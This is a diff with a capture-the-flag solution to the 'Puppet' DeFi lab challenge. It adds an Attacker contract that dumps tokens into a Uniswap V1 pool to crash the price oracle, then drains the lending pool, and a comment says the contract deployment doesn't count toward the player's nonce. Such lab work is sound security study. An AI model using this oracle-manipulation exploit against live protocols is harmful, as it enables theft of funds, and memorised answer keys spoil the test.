@@ -92,7 +92,14 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        // Deploy attacker contract BEFORE prank (doesn't count toward player nonce)
+        Attacker attacker = new Attacker(token, lendingPool, uniswapV1Exchange, recovery);
+        // Transfer player's tokens and ETH to attacker
+        token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
+        (bool sent,) = address(attacker).call{value: PLAYER_INITIAL_ETH_BALANCE}("");
+        require(sent, "ETH transfer failed");
+        // Execute: swap all DVT -> crash oracle -> borrow all pool tokens
+        attacker.execute(POOL_INITIAL_TOKEN_BALANCE);
     }
 
     // Utility function to calculate Uniswap prices
@@ -116,3 +123,37 @@ contract PuppetChallenge is Test {
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
 }
+
+contract Attacker {
+    DamnValuableToken public token;
+    PuppetPool public lendingPool;
+    IUniswapV1Exchange public uniswapV1Exchange;
+    address public recovery;
+
+    constructor(DamnValuableToken _token, PuppetPool _lendingPool, IUniswapV1Exchange _exchange, address _recovery) {
+        token = _token;
+        lendingPool = _lendingPool;
+        uniswapV1Exchange = _exchange;
+        recovery = _recovery;
+    }
+
+    function execute(uint256 borrowAmount) external {
+        // 1. Approve all DVT to Uniswap
+        token.approve(address(uniswapV1Exchange), token.balanceOf(address(this)));
+        // 2. Dump all DVT into Uniswap V1 — crashes the oracle price
+        uniswapV1Exchange.tokenToEthSwapInput(
+            token.balanceOf(address(this)),
+            1, // min_eth (we just want the dump)
+            block.timestamp * 2
+        );
+        // 3. Now the oracle price is super low — borrow all pool tokens with minimal ETH
+        // borrow() is payable; excess ETH is refunded automatically
+        (bool ok,) = address(lendingPool).call{value: address(this).balance}(
+            abi.encodeCall(lendingPool.borrow, (borrowAmount, recovery))
+        );
+        require(ok, "borrow failed");
+    }
+
+    receive() external payable {}
+}
+
